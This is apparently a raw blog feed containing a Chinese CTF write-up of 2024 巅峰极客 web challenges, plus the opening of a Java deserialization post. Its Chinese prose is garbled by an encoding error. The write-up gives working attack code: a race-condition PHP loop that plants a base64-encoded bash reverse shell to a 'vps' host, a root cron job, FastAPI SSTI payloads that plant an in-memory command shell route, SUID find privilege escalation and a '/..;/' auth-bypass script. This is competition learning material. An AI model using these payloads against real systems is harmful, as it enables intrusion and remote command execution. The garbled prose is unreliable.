class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> secrets<br><br><br>app = Flask(__name__)<br>app.secret_key = secrets.token_hex(<span class="hljs-number">16</span>)<br>working_id = []<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-built_in">id</span> = request.form[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">id</span>.isalnum() <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>) != <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;æ— æ•ˆçš„ID&#x27;</span><br>        session[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-built_in">id</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">f&#x27;/sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span>):<br>            os.popen(<span class="hljs-string">f&#x27;mkdir /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &amp;&amp; chown www-data /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &amp;&amp; chmod a+w /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;sandbox&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;submit_id.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/sandbox&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;submit_code.html&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no id&#x27;</span><br>        user_id = session[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">in</span> working_id:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;task is still running&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            working_id.append(user_id)<br>            code = request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>)<br>            os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;sudo -u www-data cp /app/init.py /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/init.py &amp;&amp; cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u www-data python3 init.py&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;rm -rf /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>).read()<br>            <br>            php_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>            php_file.write(code)<br>            php_file.close()<br><br>            result = os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u nobody php phpcode&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()<br>            working_id.remove(user_id)<br><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>å…¶å®è¿™é“é¢˜ä¸ç®—éš¾ï¼Œåšæ³•ä¹Ÿå¾ˆå¤šï¼Œå…±åŒç‚¹æ˜¯åˆ©ç”¨<code>rm *</code>æ— æ³•åˆ é™¤æ–‡ä»¶å¤¹çš„æ€§è´¨ï¼Œå°±å¯ä»¥å®ç°åœ¨ä¸€ä¸ªæ²™ç®±é‡Œæ¡ä»¶ç«äº‰ï¼ŒæŠŠå¦ä¸€ä¸ªæ²™ç®±çš„init.pyé‡å†™ï¼Œç„¶åè§¦å‘init.pyã€‚</p><p>æˆ‘æ˜¯ç”¨çš„é‡å†™init.pyåå¼¹shellï¼Œæ‹¿åˆ°www-dataæƒé™ï¼š</p><p>å¼€ä¸ªæ²™ç®±EDDIE123å’ŒEDDIE321ï¼Œåœ¨æ²™ç®±EDDIE123ä¸­æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm /sandbox/EDDIE321/init.py &amp;&amp; echo &#x27;CmltcG9ydCBvczsKb3MucG9wZW4oImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvdnBzL3BvcnQgMD4mMSciKQ==&#x27; | base64 -d &gt; /sandbox/EDDIE321/init.py&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>while(1)æ˜¯ç”¨ä½œå¾ªç¯ç«äº‰ï¼Œä½¿å¾—init.pyå¿…ç„¶èƒ½é‡å†™ã€‚</p><p>ç„¶ååœ¨EDDIE321ä¸­éšä¾¿æ‰§è¡Œä¸ªechoï¼ŒæŒ‰ç…§ä»£ç é€»è¾‘å°±èƒ½èµ°åˆ°<code>sudo -u www-data python3 init.py</code>ï¼Œä»è€Œå®ç°åå¼¹shellï¼š</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819154938430.png" alt="image-20240819154938430"></p><p>ps -auxå‘ç°rootæƒé™å¼€å¯äº†cronï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æƒ³åˆ°å†™å®šæ—¶ä»»åŠ¡è¿›å»ï¼Œ<code>chmod 777 /flag</code>ç„¶åè¯»å°±å®Œäº‹äº†ã€‚</p><p>é¦–å…ˆæ˜¯æŠŠ&#x2F;etc&#x2F;cron.dä¸å¦å¤–ä¸€ä¸ªæ²™ç®±ï¼ˆè¿™é‡Œæˆ‘è¿˜åˆ›äº†ä¸ªEDDIECRYï¼‰è½¯é“¾æ¥ï¼Œä»è€Œä¸‹é¢åˆ›å»ºphpcodeçš„æ—¶å€™å°±èƒ½æŠŠå®šæ—¶ä»»åŠ¡å†™è¿›å»ã€‚</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819163527316.png" alt="image-20240819163527316"></p><p>å³åœ¨EDDIECRYä¸­å†™å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># &lt;?php system(&#x27;sudo -l&#x27;); ?&gt;</span><br>* * * * * root <span class="hljs-built_in">chmod</span> 777 /flag<br></code></pre></td></tr></table></figure><p>phpcodeå†…å®¹åŠ äº†â¼€å¥php system æ‰§è¡Œ<code>sudo -l</code>, è¿™ä¸ªæ˜¯ä¸ºäº†é˜»å¡è„šæœ¬çš„æ‰§è¡Œ, ä½¿å¾—cronæœ‰è¶³å¤Ÿçš„æ—¶é—´è°ƒåº¦è®¡åˆ’ä»»åŠ¡ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿè¯•äº†while(1)çš„ç«äº‰ï¼Œä½†æ˜¯å¥½åƒæ•ˆæœä¸å¤ªå¥½emmmï¼Œå…¶å®ä¹Ÿå¯ä»¥å†™<code>&lt;?php sleep(1000);?&gt;</code>è¿™ç§è¾¾åˆ°æ•ˆæœã€‚</p><p>æ­¤å¤„å½“ç„¶ä¹Ÿå¯ä»¥å†æ¬¡åå¼¹shellï¼Œæ‹¿åˆ°çš„å°±æ˜¯rootæƒé™ã€‚</p><p>ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œcat &#x2F;flagå°±å®Œäº†ã€‚</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819163534524.png" alt="image-20240819163534524"></p><h2 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h2><p>fastapiçš„sstiï¼Œä¸å‡ºç½‘ï¼Œè¿‡æ»¤æ•°å­—å’Œ%ï¼Œæ— å›æ˜¾æ‰“å†…å­˜é©¬ã€‚</p><p>å› ä¸ºè¿™é‡Œç”¨çš„æ˜¯fastapiï¼Œæ‰€ä»¥ä¸èƒ½ç”¨add_url_ruleæ·»åŠ å†…å­˜é©¬ï¼Œå¾—ç”¨add_api_routeæ·»åŠ å†…å­˜é©¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> url = <span class="hljs-string">&#x27;http://eci</span><br><span class="hljs-string">2ze870nxuud7kn92ktzy.cloudeci1.ichunqiu.com:8000/calc&#x27;</span><br> <span class="hljs-comment"># url = &#x27;http://127.0.0.1:8000/calc&#x27;</span><br> payload = <br><span class="hljs-string">r&#x27;&#x27;&#x27;app.routes[(dict(e=a)|join|count)].__class__.__init__.__builtins_</span><br><span class="hljs-string"> _[&#x27;eval&#x27;](&quot;app.add_api_route(&#x27;/shell&#x27;, lambda x: </span><br><span class="hljs-string">__import__(&#x27;os&#x27;).popen(x).read())&quot;, &#123;&#x27;app&#x27;:app&#125;)&#x27;&#x27;&#x27;</span><br> resp = requests.get(url, params=&#123;<span class="hljs-string">&#x27;calc_req&#x27;</span>: payload&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><p>payloadæœ‰å¾ˆå¤šï¼Œä¹Ÿå¯ä»¥ï¼ˆæ¥è‡ª[<a href="https://mp.weixin.qq.com/s/rQj3h-CTakLSMppuz0tCKg">éšæ‰‹åˆ†äº«]2024å·…å³°æå®¢åˆèµ› éƒ¨åˆ†Web (qq.com)</a>ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">undefinded.__class__.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_api_route(&#x27;/flag&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—® &#x2F;shell?x&#x3D;cat &#x2F;flagå°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œå…¶å®è¿˜å¯ä»¥ç”¨é™æ€ç›®å½•çš„æ–¹æ³•ã€‚</p><p>åœ¨ FastAPI ä¸­ï¼Œapp.mount() ç”¨æ¥ä¸ºé™æ€æ–‡ä»¶æŒ‡å®šä¸€ä¸ªè·¯å¾„ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡ app.mount(â€œ&#x2F;staticâ€, StaticFiles(directory&#x3D;â€staticâ€), name&#x3D;â€staticâ€) å°†é™æ€æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸º â€œstaticâ€ ç›®å½•ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•å°†é™æ€æ–‡ä»¶ç›®å½•æ”¹ä¸ºæ ¹ç›®å½•å†è¯»flagï¼Œpayloadæ¥è‡ª<a href="https://mp.weixin.qq.com/s/CTcT5j8wYE0UmcLlMwVPsw">2024å·…å³°æå®¢æŒ‘æˆ˜èµ›â€”WriteUp By EDISEC (qq.com)</a>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.mount(<span class="hljs-string">&#x27;/static&#x27;</span>, lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;starlette.staticfiles&#x27;</span>).staticfiles.StaticFiles(directory=<span class="hljs-string">&#x27;/&#x27;</span>), name=<span class="hljs-string">&#x27;static&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>&lt;url&gt;/static/flag</code>äº¤äº†ã€‚</p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>é»‘ç›’ï¼Œç»™äº†ä¸€ä¸ªbase64çš„ååºåˆ—åŒ–å…¥å£ï¼Œhintæ˜¯jdk17+CBé“¾ã€‚</p><p>å¦‚æœåªæœ‰ä¸ªCBé“¾å½“ç„¶å¾ˆç®€å•ï¼Œå·¥å…·éƒ½èƒ½ä¸€æŠŠæ¢­ã€‚ä½†æ˜¯å¥—äº†ä¸ªjdk17ã€‚</p><p>çœ‹äº†NU1Læˆ˜é˜Ÿçš„wpåï¼Œæ‰çŸ¥é“å®é™…ä¸Šæ–°ç‰ˆæœ¬<code>commons-beanutils</code>â¼€èˆ¬ä¼šåŒæ—¶å¸¦ä¸Š<code>commons collections</code>ã€‚</p><p>è€Œä¸”é¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥è¦æ‰“ä¸€ä¸ªå†…å­˜é©¬è¿›å»ã€‚</p><p>é¢˜ç›®ä¼šåœ¨ååºåˆ—åŒ–å‰è¿‡æ»¤<code>org.apache</code>å¼€å¤´çš„ç±», ä½†å‘ç°å¯ä»¥ç”¨<code>utf-8 overlong encoding</code>ç»•è¿‡ã€‚</p><p><code>utf-8 overlong encoding</code>å‚è€ƒ:</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8OverlongEncoding/UTF8OverlongObjectOutputStream.java">JYso&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;qi4l&#x2F;jndi&#x2F;gadgets&#x2F;utils&#x2F;utf8OverlongEncoding&#x2F;UTF8OverlongObjectOutputStream.java at master Â· qi4L&#x2F;JYso (github.com)</a></p><p>æ‰€ä»¥å¦‚æ­¤æ‰“ä¸ªCCé“¾å°±å‡ºäº†ã€‚</p><p>EXPå¯åœ¨NU1Lå…¬ä¼—å·é‡ŒæŸ¥çœ‹ï¼Œè¿™é‡Œå°±ä¸ç»™å‡ºäº†ã€‚</p><h2 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h2><p>å‰å°å¯ä»¥å¼±å¯†ç <code>admin/qwe123!@#</code>ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç›´æ¥ç»•äº†ã€‚</p><p>è®¿é—®&#x2F;admin.htmlå¯ä»¥ç›´æ¥æ‹¿åˆ°æ–‡ä»¶ä¸Šä¼ çš„æ“ä½œé¡µé¢ï¼š</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819174151906.png" alt="image-20240819174151906"></p><p>fuzzä¸€ä¸‹æ‰§è¡Œå‘½ä»¤å¤„çš„banä½ï¼Œå‘ç°å¯ç”¨å­—ç¬¦ä¸ºtã€*ã€.ã€&#x2F;ä»¥åŠå„ç§æ•°å­—ã€‚</p><p>è¿™é‡Œå®¹æ˜“æƒ³åˆ°ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œï¼Œç”¨åˆ°<code>./t*/*</code>çš„payloadï¼Œç›´æ¥å°±å‡ºäº†ã€‚</p><p>æ¯”å¦‚ä¸Šä¼ ä¸€ä¸ª1.pngï¼Œå†…å®¹ä¸º</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤å¤„ä½¿ç”¨<code>./t*/*</code>ï¼Œå‘ç°æƒé™ä¸ºctfã€‚</p><p>å¦‚æ³•ç‚®åˆ¶ï¼Œsuidææƒå‘ç°findå¯ç”¨ï¼Œç›´æ¥findææƒäº¤äº†ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">touch</span> /tmp/test &amp;&amp; find /tmp/test -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure><h2 id="old-api"><a href="#old-api" class="headerlink" title="old_api"></a>old_api</h2><p>åˆæ˜¯jdk17ã€‚</p><p>è¿™é“å…¶å®æŒºå¯æƒœçš„ï¼Œå­¦é•¿çš„æœ¬åœ°dockeré€šäº†ï¼Œä½†æ˜¯è¿œç¨‹ä¸å‡ºç½‘ï¼Œæ²¡æ¥å¾—åŠå†™å†…å­˜é©¬ï¼Œæ‰€ä»¥æ²¡äº¤ä¸Šã€‚</p><p>ç»™äº†c3p0å’Œh2çš„ä¾èµ–ï¼Œæºç é‡å¾ˆå¤§ï¼Œè®¿é—®é¡µé¢ä¹Ÿå°±æ˜¯apiæ“ä½œé¡µé¢ï¼Œå®¡è®¡æºç å‘ç°v1çš„AdminController#importPostå­˜åœ¨readObjectï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯ååºåˆ—åŒ–å…¥å£ç‚¹ã€‚</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819175127207.png" alt="image-20240819175127207"></p><p>ç»“åˆé¢˜ç›®ä¿¡æ¯ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°è¿™é“é¢˜ä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€æ­¥æ˜¯ç»•è¿‡v2è®¿é—®åˆ°v1çš„è¿™ä¸ªæ–¹æ³•è§¦å‘readObjectï¼Œç¬¬äºŒæ­¥æ˜¯æ‰“H2çš„jdbcååºåˆ—åŒ–ï¼Œè¿™é‡Œç”¨çš„å°±æ˜¯Jackson-h2çš„é“¾å­ã€‚</p><p>è€Œä¸”jdk17ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯å‡ºçš„JDBCæ‰“æ³•ï¼Œä»å‡ ä¸ªæœˆå‰çš„AliyunCTF-Chain17å°±å¯è§ä¸€æ–‘ã€‚</p><p>ç¬¬ä¸€æ­¥ç»•è¿‡ä¹Ÿä¸ç®—å¤ªéš¾ï¼Œ21çº§çš„SEå­¦é•¿ç»™å‡ºäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>base = <span class="hljs-string">&quot;http://localhost:8081/&quot;</span><br><br>session = requests.Session()<br><br>r = session.post(base + <span class="hljs-string">&quot;/public/register&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>r = session.post(base + <span class="hljs-string">&quot;/public/login&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>r = session.post(base + <span class="hljs-string">&quot;/..;/v1/admin/post/import&quot;</span>, data=&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: <span class="hljs-string">&quot;Sakura&quot;</span><br>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ç”¨<code>/..;/v1/admin/post/import</code>å¯ä»¥ç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯Jackson + H2çš„JDBCæ‰‹æ³•ã€‚</p><p>ï¼ˆæœªå®Œå¾…ç»­ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java_Deser-é‡èµ°å…«åä¸€éš¾</title>
    <link href="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/"/>
    <url>/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰javaåŸºç¡€ä¸ç‰¢ï¼Œåªèƒ½AWDPä¿®ä¸€ä¿®ï¼Œç°åœ¨å­¦çš„ä¸ªä¸ƒä¸ƒå…«å…«äº†ï¼Œè¿˜å¾—åˆºåˆ€è§çº¢ã€‚</p><p>ä»¥å‰åšè¿‡å‡ ä¸ªjavaï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯æŠ„expï¼Œæ²¡æœ‰ä»€ä¹ˆgadgetçš„è®¤çŸ¥ï¼Œè¿™æ¬¡é‡èµ°å…«åä¸€éš¾ï¼Œå¿…è¯è©æé‡‘èº«ã€‚</p><h2 id="CISCN2023-åˆèµ›-DeserBug"><a href="#CISCN2023-åˆèµ›-DeserBug" class="headerlink" title="[CISCN2023 åˆèµ›]-DeserBug"></a>[CISCN2023 åˆèµ›]-DeserBug</h2><p>ç®—æˆ‘çš„javaååºåˆ—åŒ–å¯è’™é¢˜ä¹‹ä¸€ã€‚è¿™é“é¢˜æ˜¯å½“å¹´çš„åˆèµ›é¢˜ç›®ï¼Œç°åœ¨çœ‹æ¥éš¾åº¦ä¸ç®—å¤ªé«˜ã€‚</p><p>hintï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept<br></code></pre></td></tr></table></figure><p>é™„ä»¶é™¤äº†DeserBugç¯å¢ƒjaråŒ…ï¼Œè¿˜ç»™äº†commons-collections-3.2.2å’Œhutool-5.8.18çš„jaråŒ…ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯CCé“¾è‡ª3.2.1åæ–°æ·»åŠ äº†checkUnsafeSerializationåŠŸèƒ½å¯¹ååºåˆ—åŒ–å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œè€ŒCCé“¾å¸¸ç”¨åˆ°çš„InvokerTransformerå°±åˆ—å…¥äº†é»‘åå•ä¸­ã€‚æ‰€ä»¥ç›´æ¥æ‰“CCé“¾è‚¯å®šä¸è¡Œã€‚</p><p>è€Œä¸”é¢˜ç›®æç¤ºäº†ä»<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>çš„éƒ¨åˆ†gadgetï¼Œé‚£æˆ‘ä»¬å°±å´ä¹‹ä¸æ­äº†ã€‚</p><p>é¦–å…ˆçœ‹çœ‹é¢˜ç›®å•¥ç©æ„ï¼ŒTestapp.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.app;<br><br><span class="hljs-keyword">import</span> cn.hutool.http.ContentType;<br><span class="hljs-keyword">import</span> cn.hutool.http.HttpUtil;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Testapp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Testapp</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        HttpUtil.createServer(<span class="hljs-number">8888</span>).addAction(<span class="hljs-string">&quot;/&quot;</span>, (request, response) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">bugstr</span> <span class="hljs-operator">=</span> request.getParam(<span class="hljs-string">&quot;bugstr&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (bugstr == <span class="hljs-literal">null</span>) &#123;<br>                response.write(<span class="hljs-string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);<br>                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode));<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> inputStream.readObject();<br>                result = object.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var8;<br>                <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>                myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;);<br>                myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title 